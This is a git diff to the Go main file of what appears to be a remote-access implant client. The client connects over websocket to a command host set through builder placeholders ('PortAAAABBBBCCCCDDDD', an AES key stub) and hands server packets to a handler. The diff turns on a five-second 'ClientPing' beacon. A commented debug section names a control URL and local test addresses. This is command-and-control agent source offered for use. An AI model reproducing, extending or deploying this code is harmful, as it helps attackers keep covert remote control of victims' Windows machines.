@@ -1,6 +1,7 @@
 package main
 
 import (
+	"fmt"
 	"main/Encrypt"
 	"main/HandlePacket"
 	"main/MessagePack"
@@ -9,7 +10,7 @@ import (
 	"strings"
 	"sync"
 	"time"
-"fmt"
+
 	"github.com/togettoyou/wsc"
 	"golang.org/x/sys/windows/registry"
 )
@@ -17,7 +18,7 @@ import (
 type Client struct {
 	Connection *wsc.Wsc
 	lock       sync.Mutex
-	keepAlive         *time.Ticker
+	keepAlive  *time.Ticker
 }
 
 func (c *Client) SendData(data []byte) {
@@ -59,7 +60,7 @@ func (c *Client) Connect(url string) {
 		// Write timeout
 		WriteWait: 10 * time.Second,
 		// The maximum length of the message supported is 512 bytes by default
-		MaxMessageSize: 1024 * 1024 * 10,
+		//MaxMessageSize: 1024 * 1024 * 10,
 		// Minimum reconnection time interval
 		MinRecTime: 2 * time.Second,
 		// Maximum reconnection time interval
@@ -107,17 +108,17 @@ func (c *Client) Connect(url string) {
 		//log.Println("binary_message_received: ", string(data))
 		HandlePacket.Read(data, c.Connection)
 	})
-	
+
 	// 开始连接
 	go c.Connection.Connect()
-	// c.keepAlive = time.NewTicker(15 * time.Second)
+	c.keepAlive = time.NewTicker(5 * time.Second)
 
 	// 	// Start a goroutine to handle the ticks
-	// 	go func() {
-	// 		for range c.keepAlive.C {
-	// 			c.KeepAlivePacket()
-	// 		}
-	// 	}()
+	go func() {
+		for range c.keepAlive.C {
+			c.KeepAlivePacket()
+		}
+	}()
 	//go controller.Start()
 	for {
 		select {
@@ -127,12 +128,12 @@ func (c *Client) Connect(url string) {
 	}
 }
 
-// func (c *Client) KeepAlivePacket() {
-// 	msgpack := new(MessagePack.MsgPack)
-// 	msgpack.ForcePathObject("Pac_ket").SetAsString("ClientPing")
-// 	msgpack.ForcePathObject("Message").SetAsString("DDDD")
-// 	c.SendData(msgpack.Encode2Bytes())
-// }
+func (c *Client) KeepAlivePacket() {
+	msgpack := new(MessagePack.MsgPack)
+	msgpack.ForcePathObject("Pac_ket").SetAsString("ClientPing")
+	msgpack.ForcePathObject("Message").SetAsString("DDDD")
+	c.SendData(msgpack.Encode2Bytes())
+}
 
 func run_main(Host string) {
 	client := &Client{}
@@ -162,15 +163,16 @@ func main() {
 	Port := "PortAAAABBBBCCCCDDDD"
 	ListenerName := "ListenNameAAAABBBBCCCCDDDD"
 	route := "RouteAAAABBBBCCCCDDDD"
+	PcInfo.AesKey = "AeskAAAABBBBCCCC"
 	PcInfo.Host = strings.ReplaceAll(Host, " ", "")
-	 PcInfo.Port = strings.ReplaceAll(Port, " ", "")
-	 PcInfo.ListenerName = strings.ReplaceAll(ListenerName, " ", "")
+	PcInfo.Port = strings.ReplaceAll(Port, " ", "")
+	PcInfo.ListenerName = strings.ReplaceAll(ListenerName, " ", "")
 	PcInfo.IsDotNetFour = checkDotNetFramework40()
 
 	///Debug
-	// Host := "192.168.244.141"
-	// Port := "8000"
-	// PcInfo.ListenerName = "wd"
+	// Host := "192.168.1.7"
+	// Port := "4000"
+	// PcInfo.ListenerName = "asd"
 
 	// route := "www"
 	// // //url := "ws://www.sftech.shop:443//www"
